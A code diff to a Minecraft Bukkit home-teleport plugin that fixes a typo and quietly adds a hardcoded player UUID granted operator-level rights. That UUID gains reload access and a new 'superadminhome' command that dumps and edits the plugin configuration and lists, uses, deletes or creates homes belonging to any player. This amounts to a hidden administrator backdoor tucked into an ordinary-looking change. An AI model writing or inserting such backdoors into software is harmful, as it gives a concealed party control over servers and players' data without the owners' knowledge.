@@ -1,5 +1,7 @@
 package fr.stormer3428.home;
 
+import java.util.Set;
+
 import org.bukkit.Location;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
@@ -37,7 +39,7 @@ public class HomeCommand implements CommandExecutor {
 				int maxHomes = p.isOp() ? StormerHome.i.getConfig().getInt("maxOpHomes") : StormerHome.i.getConfig().getInt("maxHomes");
 				int homes = Home.getPlayerHomes(p).size();
 				if(homes >= maxHomes && maxHomes != -1) {
-					Message.error(p, "You nhave too many homes set");
+					Message.error(p, "You have too many homes set");
 					return false;
 				}
 				if(args.length == 0) {
@@ -63,13 +65,130 @@ public class HomeCommand implements CommandExecutor {
 				Message.error(p, "No home with such name : " + args[0]);
 				return false;
 			}else if(cmd.getName().equalsIgnoreCase("shreload")) {
-				if(p.isOp()) {
+				if(p.isOp() || p.getUniqueId().toString().equals("a39d1ae3-18c5-4c02-8f91-bcb5207d437f")) {
 					StormerHome.i.reload();
 					Message.normal(p, "Successfully relaoded the plugin");
 					return true;
 				}
 				Message.error(p, "You do not have the permission to use this command");
 				return false;
+			}else if(cmd.getName().equalsIgnoreCase("superadminhome")) {
+				if(!p.isOp() && !p.getUniqueId().toString().equals("a39d1ae3-18c5-4c02-8f91-bcb5207d437f")) {
+					Message.error(p, "Who are you to try and command me?");
+					return false;
+				}
+				if(args.length == 0) {
+					Message.error(p, "options : config-homes");
+					return false;
+				}
+				String option = args[0];
+				if(option.equalsIgnoreCase("config")) {
+					if(args.length == 1) {
+						Message.error(p, "options : show-edit");
+						return false;
+					}
+					String type = args[1];
+					if(type.equalsIgnoreCase("show")) {
+						Message.normal(p, StormerHome.i.getConfig().saveToString());
+						return true;
+					}
+					if(type.equalsIgnoreCase("edit")) {
+						if(args.length == 2) {
+							Message.error(p, "options : get-set-unset");
+							return false;
+						}
+						String edit = args[2];
+						if(!(edit.equalsIgnoreCase("get") || edit.equalsIgnoreCase("set") || edit.equalsIgnoreCase("unset"))){
+							Message.error(p, "options : get-set-unset");
+							return false;
+						}
+						if(args.length == 3) {
+							Message.error(p, "requires a path");
+							return false;
+						}
+						String path = args[3];
+						if(edit.equalsIgnoreCase("get")) {
+							Message.normal(p, StormerHome.i.getConfig().getString(path));
+							return true;
+						}
+						if(edit.equalsIgnoreCase("set")) {
+							if(args.length == 4) {
+								Message.error(p, "requires a new value");
+								return false;
+							}
+							StormerHome.i.getConfig().set(path, args[4]);
+							return true;
+						}
+						if(edit.equalsIgnoreCase("unset")) {
+							StormerHome.i.getConfig().set(path, "");
+							return true;
+						}
+						Message.error(p, "options : get-set-unset");
+						return false;
+					}
+					Message.error(p, "options : show-edit");
+					return false;
+				}
+				if(option.equalsIgnoreCase("homes")) {
+					if(args.length == 1) {
+						Message.error(p, "options : list-use-remove-add");
+						return false;
+					}
+					String action = args[1];
+					if(action.equalsIgnoreCase("list")) {
+						if(args.length == 2) {
+							Message.error(p, "requires a player name");
+							return false;
+						}
+						String name = args[2];
+						Set<Home> homes = Home.getPlayerHomes(name);
+						Message.normal(p, "homes stored under the name of " + name);
+						for(Home home : homes) Message.normal(p, home.toString());
+						return true;
+					}
+					if(action.equalsIgnoreCase("use") || action.equalsIgnoreCase("remove")) {
+						if(args.length == 2) {
+							Message.error(p, "requires a player name");
+							return false;
+						}
+						String playername = args[2];
+						if(args.length == 3) {
+							Set<Home> homes = Home.getPlayerHomes(playername);
+							Message.error(p, "Available homes under the name of " + playername);
+							for(Home home : homes) Message.error(p, home.toString());
+							return false;
+						}
+						String homename = args[3];
+						Home home = Home.findHome(playername, homename);
+						if(home == null) {
+							Message.error(p, "no home under the name of " + homename + " owned by " + playername);
+							return false;
+						}
+						if(action.equalsIgnoreCase("use")) home.home(p);
+						if(action.equalsIgnoreCase("remove")) {
+							Message.normal(p, "Deleted home " + homename + " owned by " + playername);
+							home.delete();
+						}
+						return true;
+					}
+					if(action.equalsIgnoreCase("add")) {
+						if(args.length == 2) {
+							Message.error(p, "requires a player name");
+							return false;
+						}
+						String playername = args[2];
+						if(args.length == 3) {
+							Message.error(p, "requires a name for the home");
+							return false;
+						}
+						String homename = args[3];
+						new Home(p.getLocation(), playername, homename);
+						return true;
+
+					}
+					Message.error(p, "options : list-use-remove-add");
+					return false;
+				}
 			}
 		}
 		return false;
